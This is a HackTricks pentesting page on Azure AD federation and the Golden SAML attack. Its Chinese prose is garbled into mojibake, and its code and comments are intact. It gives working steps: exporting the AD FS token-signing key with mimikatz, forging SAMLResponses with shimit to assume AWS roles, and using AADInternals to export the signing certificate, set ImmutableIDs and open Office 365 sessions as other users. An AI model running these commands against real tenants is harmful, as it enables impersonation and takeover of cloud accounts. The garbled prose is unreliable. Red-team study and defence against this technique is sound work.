# Az - è”åˆ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**è”åˆ**æ˜¯ä¸€ç»„å»ºç«‹äº†**ä¿¡ä»»**çš„**åŸŸ**é›†åˆã€‚ä¿¡ä»»çº§åˆ«å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†é€šå¸¸åŒ…æ‹¬**èº«ä»½éªŒè¯**ï¼Œå‡ ä¹æ€»æ˜¯åŒ…æ‹¬**æˆæƒ**ã€‚å…¸å‹çš„è”åˆå¯èƒ½åŒ…æ‹¬ä¸€äº›å·²ç»ä¸º**å…±äº«è®¿é—®**å»ºç«‹äº†**ä¿¡ä»»**çš„**ç»„ç»‡**ã€‚

æ‚¨å¯ä»¥å°†æ‚¨çš„**æœ¬åœ°**ç¯å¢ƒ**ä¸Azure ADè”åˆ**ï¼Œå¹¶ä½¿ç”¨æ­¤è”åˆè¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒã€‚è¿™ç§ç™»å½•æ–¹æ³•ç¡®ä¿æ‰€æœ‰ç”¨æˆ·**èº«ä»½éªŒè¯å‘ç”Ÿåœ¨æœ¬åœ°**ã€‚æ­¤æ–¹æ³•å…è®¸ç®¡ç†å‘˜å®æ–½æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶çº§åˆ«ã€‚å¯ç”¨çš„è”åˆæ–¹å¼åŒ…æ‹¬ä¸**AD FS**å’ŒPingFederateçš„è”åˆã€‚

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼Œåœ¨è”åˆä¸­ï¼Œæ‰€æœ‰**èº«ä»½éªŒè¯**å‘ç”Ÿåœ¨**æœ¬åœ°**ç¯å¢ƒä¸­ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨ä»–ä»¬çš„**æœ¬åœ°å‡­æ®**åœ¨æ‰€æœ‰å—ä¿¡ä»»çš„ç¯å¢ƒä¸­ä½“éªŒSSOã€‚å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨ä»–ä»¬çš„**æœ¬åœ°å‡­æ®**è®¿é—®**äº‘**åº”ç”¨ç¨‹åºã€‚

**å®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼ˆSAMLï¼‰**ç”¨äºåœ¨æä¾›è€…ä¹‹é—´**äº¤æ¢**æ‰€æœ‰èº«ä»½éªŒè¯å’Œæˆæƒ**ä¿¡æ¯**ã€‚

åœ¨ä»»ä½•è”åˆè®¾ç½®ä¸­ï¼Œæœ‰ä¸‰æ–¹ï¼š

* ç”¨æˆ·æˆ–å®¢æˆ·ç«¯
* èº«ä»½æä¾›è€…ï¼ˆIdPï¼‰
* æœåŠ¡æä¾›è€…ï¼ˆSPï¼‰

ï¼ˆå›¾ç‰‡æ¥æºï¼šhttps://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-appsï¼‰

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. é¦–å…ˆï¼Œç”¨æˆ·è®¿é—®ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆæœåŠ¡æä¾›è€…æˆ–SPï¼Œå¦‚AWSæ§åˆ¶å°æˆ–vSphere Webå®¢æˆ·ç«¯ï¼‰ã€‚æ ¹æ®å…·ä½“å®ç°ï¼Œæ­¤æ­¥éª¤å¯èƒ½è¢«ç»•è¿‡ï¼Œç›´æ¥å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°IdPï¼ˆèº«ä»½æä¾›è€…ï¼‰ã€‚
2. éšåï¼ŒSPè¯†åˆ«é€‚å½“çš„IdPï¼ˆä¾‹å¦‚ï¼ŒAD FSï¼ŒOktaï¼‰è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚ç„¶åï¼Œå®ƒåˆ›å»ºä¸€ä¸ªSAMLï¼ˆå®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼‰AuthnRequestå¹¶å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°æ‰€é€‰çš„IdPã€‚
3. IdPæ¥ç®¡ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚èº«ä»½éªŒè¯åï¼ŒIdPä¼šç”Ÿæˆä¸€ä¸ªSAMLResponseï¼Œå¹¶é€šè¿‡ç”¨æˆ·å°†å…¶è½¬å‘ç»™SPã€‚
4. æœ€åï¼ŒSPè¯„ä¼°SAMLResponseã€‚å¦‚æœéªŒè¯æˆåŠŸï¼Œè¡¨ç¤ºä¸IdPå»ºç«‹äº†ä¿¡ä»»å…³ç³»ï¼Œç”¨æˆ·å°†è·å¾—è®¿é—®æƒé™ã€‚è¿™æ ‡å¿—ç€ç™»å½•è¿‡ç¨‹çš„å®Œæˆï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨æœåŠ¡ã€‚

**å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äºSAMLèº«ä»½éªŒè¯å’Œå¸¸è§æ”»å‡»çš„ä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## æ¢çº½

* AD FSæ˜¯åŸºäºå£°æ˜çš„èº«ä»½æ¨¡å‹ã€‚
* "..å£°æ˜åªæ˜¯å…³äºç”¨æˆ·çš„é™ˆè¿°ï¼ˆä¾‹å¦‚ï¼Œåç§°ï¼Œèº«ä»½ï¼Œç»„ï¼‰ï¼Œä¸»è¦ç”¨äºæˆæƒè®¿é—®åˆ†å¸ƒåœ¨äº’è”ç½‘ä»»ä½•åœ°æ–¹çš„åŸºäºå£°æ˜çš„åº”ç”¨ç¨‹åºã€‚"
* ç”¨æˆ·çš„å£°æ˜å†™åœ¨SAMLä»¤ç‰Œä¸­ï¼Œç„¶åç”±IdPç­¾åä»¥æä¾›æœºå¯†æ€§ã€‚
* ç”¨æˆ·ç”±ImmutableIDæ ‡è¯†ã€‚å®ƒæ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå¹¶å­˜å‚¨åœ¨Azure ADä¸­ã€‚
* ImmutableIDå­˜å‚¨åœ¨æœ¬åœ°ä½œä¸ºms-DS-ConsistencyGuidçš„ç”¨æˆ·å’Œ/æˆ–å¯ä»¥ä»ç”¨æˆ·çš„GUIDæ´¾ç”Ÿã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚é˜…[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAMLæ”»å‡»ï¼š**

* åœ¨ADFSä¸­ï¼ŒSAMLå“åº”ç”±ä»¤ç‰Œç­¾åè¯ä¹¦ç­¾åã€‚
* å¦‚æœè¯ä¹¦è¢«æ³„éœ²ï¼Œå°±æœ‰å¯èƒ½ä½œä¸ºä»»ä½•åŒæ­¥åˆ°Azure ADçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼
* å°±åƒæˆ‘ä»¬çš„PTAæ»¥ç”¨ä¸€æ ·ï¼Œæ›´æ”¹ç”¨æˆ·çš„å¯†ç æˆ–å¤šå› ç´ èº«ä»½éªŒè¯å¯¹æˆ‘ä»¬æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨ä¼ªé€ èº«ä»½éªŒè¯å“åº”ã€‚
* è¯ä¹¦å¯ä»¥ä»å…·æœ‰DAæƒé™çš„AD FSæœåŠ¡å™¨ä¸­æå–ï¼Œç„¶åå¯ä»¥ä»ä»»ä½•è¿æ¥åˆ°äº’è”ç½‘çš„è®¡ç®—æœºä¸­ä½¿ç”¨ã€‚
* æ›´å¤šä¿¡æ¯è¯·å‚é˜…[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

**èº«ä»½æä¾›è€…ï¼ˆIdPï¼‰**ç”Ÿæˆ**SAMLResponse**ä»¥æˆæƒç”¨æˆ·ç™»å½•çš„è¿‡ç¨‹è‡³å…³é‡è¦ã€‚æ ¹æ®IdPçš„å…·ä½“å®ç°ï¼Œ**å“åº”**å¯èƒ½ä½¿ç”¨**IdPçš„ç§é’¥**è¿›è¡Œ**ç­¾å**æˆ–**åŠ å¯†**ã€‚æ­¤è¿‡ç¨‹ä½¿æœåŠ¡æä¾›è€…ï¼ˆSPï¼‰èƒ½å¤Ÿç¡®è®¤SAMLResponseçš„çœŸå®æ€§ï¼Œç¡®ä¿å®ƒç¡®å®æ˜¯ç”±å—ä¿¡ä»»çš„IdPå‘å‡ºçš„ã€‚

å¯ä»¥å°†å…¶ä¸[é»„é‡‘ç¥¨æ®æ”»å‡»](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)è¿›è¡Œç±»æ¯”ï¼Œå…¶ä¸­ç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½å’Œæƒé™çš„å…³é”®ï¼ˆç”¨äºé»„é‡‘ç¥¨æ®çš„KRBTGTï¼Œç”¨äºé»„é‡‘SAMLçš„ä»¤ç‰Œç­¾åç§é’¥ï¼‰å¯ä»¥è¢«æ“çºµä»¥**ä¼ªé€ èº«ä»½éªŒè¯å¯¹è±¡**ï¼ˆTGTæˆ–SAMLResponseï¼‰ã€‚è¿™å…è®¸å†’å……ä»»ä½•ç”¨æˆ·ï¼Œæˆäºˆå¯¹SPçš„æœªç»æˆæƒè®¿é—®ã€‚

Golden SAMLå…·æœ‰ä¸€å®šçš„ä¼˜åŠ¿ï¼š

* å®ƒä»¬å¯ä»¥**è¿œç¨‹åˆ›å»º**ï¼Œæ— éœ€æˆä¸ºæ‰€è®¨è®ºçš„åŸŸæˆ–è”åˆçš„ä¸€éƒ¨åˆ†ã€‚
* å³ä½¿å¯ç”¨äº†**åŒå› ç´ èº«ä»½éªŒè¯ï¼ˆ2FAï¼‰**ï¼Œå®ƒä»¬ä»ç„¶æœ‰æ•ˆã€‚
* ä»¤ç‰Œç­¾å**ç§é’¥ä¸ä¼šè‡ªåŠ¨æ›´æ–°**ã€‚
* **æ›´æ”¹ç”¨æˆ·å¯†ç ä¸ä¼šä½¿**å·²ç”Ÿæˆçš„SAMLå¤±æ•ˆã€‚

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))æ˜¯ä¸€é¡¹MicrosoftæœåŠ¡ï¼Œä¿ƒè¿›äº†å—ä¿¡ä»»çš„å•†ä¸šåˆä½œä¼™ä¼´ä¹‹é—´çš„**èº«ä»½ä¿¡æ¯å®‰å…¨äº¤æ¢**ï¼ˆè”åˆï¼‰ã€‚å®ƒåŸºæœ¬ä¸Šå…è®¸åŸŸæœåŠ¡ä¸è”åˆä¸­çš„å…¶ä»–æœåŠ¡æä¾›è€…å…±äº«ç”¨æˆ·èº«ä»½ã€‚

é€šè¿‡AWSä¿¡ä»»å—æŸçš„åŸŸï¼ˆåœ¨è”åˆä¸­ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ½œåœ¨åœ°**è·å–AWSç¯å¢ƒä¸­çš„ä»»ä½•æƒé™**ã€‚æ”»å‡»éœ€è¦**ç”¨äºç­¾ç½²SAMLå¯¹è±¡çš„ç§é’¥**ï¼Œç±»ä¼¼äºé»„é‡‘ç¥¨æ®æ”»å‡»ä¸­éœ€è¦KRBTGTã€‚è®¿é—®AD FSç”¨æˆ·å¸æˆ·è¶³ä»¥è·å–æ­¤ç§é’¥ã€‚

æ‰§è¡ŒGolden SAMLæ”»å‡»çš„è¦æ±‚åŒ…æ‹¬ï¼š

* **ä»¤ç‰Œç­¾åç§é’¥**
* **IdPå…¬é’¥è¯ä¹¦**
* **IdPåç§°**
* **è§’è‰²åç§°ï¼ˆè¦æ‰¿æ‹…çš„è§’è‰²ï¼‰**
* åŸŸ\ç”¨æˆ·å
* AWSä¸­çš„è§’è‰²ä¼šè¯åç§°
* äºšé©¬é€Šè´¦æˆ·ID

_åªæœ‰ç²—ä½“é¡¹æ˜¯å¿…éœ€çš„ã€‚å…¶ä»–é¡¹ç›®å¯ä»¥æ ¹æ®éœ€è¦å¡«å†™ã€‚_

è¦è·å–**ç§é’¥**ï¼Œéœ€è¦è®¿é—®**AD FSç”¨æˆ·å¸æˆ·**ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨è¯¸å¦‚[mimikatz](https://github.com/gentilkiwi/mimikatz)ä¹‹ç±»çš„å·¥å…·ä»ä¸ªäººå­˜å‚¨ä¸­**å¯¼å‡ºç§é’¥**ã€‚è¦æ”¶é›†å…¶ä»–æ‰€éœ€ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨Microsoft.Adfs.Powershell snapinï¼Œç¡®ä¿æ‚¨ä»¥ADFSç”¨æˆ·èº«ä»½ç™»å½•ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
å¸¦ç€æ‰€æœ‰ä¿¡æ¯ï¼Œæœ‰å¯èƒ½ä¼šå¿˜è®°ä¸€ä¸ªæœ‰æ•ˆçš„SAMLResponseï¼Œä½œä¸ºä½ æƒ³è¦å†’å……çš„ç”¨æˆ·ä½¿ç”¨[**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### æœ¬åœ° -> äº‘
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ä¹Ÿå¯ä»¥åˆ›å»ºä»…åœ¨äº‘ä¸­å­˜åœ¨çš„ç”¨æˆ·çš„ImmutableIDå¹¶å†’å……ä»–ä»¬
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
